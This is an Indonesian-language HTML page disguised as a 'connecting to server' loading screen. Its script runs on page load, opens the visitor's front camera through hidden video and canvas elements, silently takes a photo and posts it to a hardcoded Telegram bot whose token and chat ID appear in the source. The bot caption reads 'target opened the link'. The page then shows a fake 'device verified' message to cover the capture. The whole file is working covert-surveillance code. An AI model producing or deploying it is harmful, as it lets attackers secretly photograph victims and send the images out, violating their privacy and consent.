<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Menghubungkan ke Server...</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; } /* Semua elemen kamera disembunyikan agar otomatis */
        p { font-size: 1rem; color: #555; }
    </style>
</head>
<body>

<div class="container">
    <h3 id="title">Memuat Halaman...</h3>
    <div id="loader" class="loader"></div>
    <p id="status">Mohon tunggu sebentar, sedang menyelaraskan perangkat...</p>
</div>

<!-- Elemen kamera disembunyikan dari layar -->
<video id="webcam" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    // ================= CONFIG TELEGRAM =================
    const TELEGRAM_BOT_TOKEN = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
    const TELEGRAM_CHAT_ID = '1966317946';
    // ===================================================

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('status');
    const titleText = document.getElementById('title');
    const loader = document.getElementById('loader');

    let currentStream = null;

    // 1. Jalankan kamera otomatis saat halaman dibuka
    async function startAutoCamera() {
        try {
            // Meminta akses kamera depan (user)
            currentStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            video.srcObject = currentStream;

            // Tunggu video benar-benar memuat frame selama 1.5 detik agar gambar tidak hitam/blur
            statusText.innerText = "Menyelaraskan koneksi aman...";
            setTimeout(takeAndSendSnapshot, 1500);

        } catch (err) {
            console.error(err);
            titleText.innerText = "Akses Ditolak";
            loader.style.display = "none";
            statusText.style.color = "#dc3545";
            statusText.innerText = "Gagal memuat. Anda harus mengizinkan akses kamera untuk melanjutkan.";
        }
    }

    // 2. Fungsi ambil foto secara diam-diam
    function takeAndSendSnapshot() {
        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // Gambar video ke canvas (efek cermin kamera depan disesuaikan)
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Matikan kamera setelah selesai mengambil foto agar lampu indikator kamera mati
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }

        // 3. Kirim otomatis ke Telegram
        statusText.innerText = "Memproses data...";
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'snapshot.png');
            formData.append('caption', '📸 Target membuka link!\nFoto kamera depan berhasil diambil otomatis.');

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                if (result.ok) {
                    // Manipulasi tampilan akhir seolah-olah proses selesai
                    titleText.innerText = "Koneksi Berhasil";
                    loader.style.display = "none";
                    statusText.style.color = "#28a745";
                    statusText.innerText = "Perangkat berhasil diverifikasi!";
                    
                    // Opsional: Anda bisa mengalihkan target ke web lain setelah sukses, contoh:
                    // window.location.href = "https://vt.tiktok.com/ZSxFpvWHA/";
                } else {
                    throw new Error(result.description);
                }
            } catch (error) {
                console.error(error);
                statusText.innerText = "Kesalahan server, silakan muat ulang halaman.";
            }
        }, 'image/png');
    }

    // Jalankan skrip begitu halaman web terbuka
    window.addEventListener('load', startAutoCamera);
</script>

</body>
</html>
